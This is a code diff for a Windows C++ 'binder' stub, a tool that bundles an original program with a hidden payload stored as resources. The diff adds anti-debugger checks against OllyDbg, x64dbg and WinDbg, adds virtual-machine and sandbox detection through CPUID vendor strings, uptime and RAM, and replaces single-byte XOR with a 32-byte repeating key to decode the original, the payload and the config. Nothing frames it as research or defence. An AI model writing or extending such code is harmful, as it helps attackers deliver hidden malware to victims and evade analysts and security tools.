@@ -2,6 +2,7 @@
 #include <string>
 #include <vector>
 #include <cstring>
+#include <intrin.h>
 
 static bool writeFileData(const std::string& path, const std::vector<char>& data) {
     HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
@@ -94,7 +95,61 @@ static bool loadResourceData(WORD id, std::vector<char>& out) {
     return true;
 }
 
+static bool binderIsDebugged() {
+    if (IsDebuggerPresent()) return true;
+    BOOL remote = FALSE;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+    if (remote) return true;
+
+    // Check PEB BeingDebugged
+#ifdef _WIN64
+    BYTE* peb = (BYTE*)__readgsqword(0x60);
+#else
+    BYTE* peb = (BYTE*)__readfsdword(0x30);
+#endif
+    if (peb && peb[2] != 0) return true;
+
+    // Check for debugger windows
+    const char* dbgClasses[] = { "OLLYDBG", "WinDbgFrameClass", "x64dbg", "x32dbg", nullptr };
+    for (int i = 0; dbgClasses[i]; i++) {
+        if (FindWindowA(dbgClasses[i], nullptr))
+            return true;
+    }
+    return false;
+}
+
+static bool binderIsSandbox() {
+    // Score-based: never kill real PCs on uptime/RAM alone
+    int score = 0;
+
+    int cpuInfo[4] = { 0 };
+    __cpuid(cpuInfo, 1);
+    if (cpuInfo[2] & (1 << 31)) {
+        __cpuid(cpuInfo, 0x40000000);
+        char vendor[13] = {};
+        memcpy(vendor + 0, &cpuInfo[1], 4);
+        memcpy(vendor + 4, &cpuInfo[2], 4);
+        memcpy(vendor + 8, &cpuInfo[3], 4);
+        vendor[12] = 0;
+        if (_stricmp(vendor, "VMwareVMware") == 0) score += 4;
+        else if (_stricmp(vendor, "VBoxVBoxVBox") == 0) score += 4;
+        else if (_stricmp(vendor, "KVMKVMKVM") == 0) score += 4;
+        else if (_stricmp(vendor, "XenVMMXenVMM") == 0) score += 4;
+    }
+
+    if (GetTickCount() < 120000)
+        score += 1;
+
+    MEMORYSTATUSEX mem = {};
+    mem.dwLength = sizeof(mem);
+    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
+        score += 1;
+
+    return score >= 4;
+}
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+    // Always run — sandbox checks live in payload options only.
     char exePath[MAX_PATH];
     GetModuleFileNameA(nullptr, exePath, MAX_PATH);
 
@@ -110,13 +165,27 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (!loadResourceData(101, original) || !loadResourceData(102, payload))
         return 1;
     loadResourceData(103, config);
-    if (!loadResourceData(104, keyData) || keyData.empty())
+    if (!loadResourceData(104, keyData) || keyData.size() < 32)
         return 1;
 
-    BYTE xorKey = (BYTE)keyData[0];
-    for (size_t i = 0; i < original.size(); i++) original[i] ^= (char)xorKey;
-    for (size_t i = 0; i < payload.size(); i++) payload[i] ^= (char)xorKey;
-    for (size_t i = 0; i < config.size(); i++) config[i] ^= (char)xorKey;
+    {
+        int n = (int)original.size();
+        for (int idx = 0; idx < n; idx++) {
+            original[idx] = (char)(original[idx] ^ keyData[idx % 32]);
+        }
+    }
+    {
+        int n = (int)payload.size();
+        for (int idx = 0; idx < n; idx++) {
+            payload[idx] = (char)(payload[idx] ^ keyData[idx % 32]);
+        }
+    }
+    {
+        int n = (int)config.size();
+        for (int idx = 0; idx < n; idx++) {
+            config[idx] = (char)(config[idx] ^ keyData[idx % 32]);
+        }
+    }
 
     if (original.size() < 64 || payload.size() < 64)
         return 1;
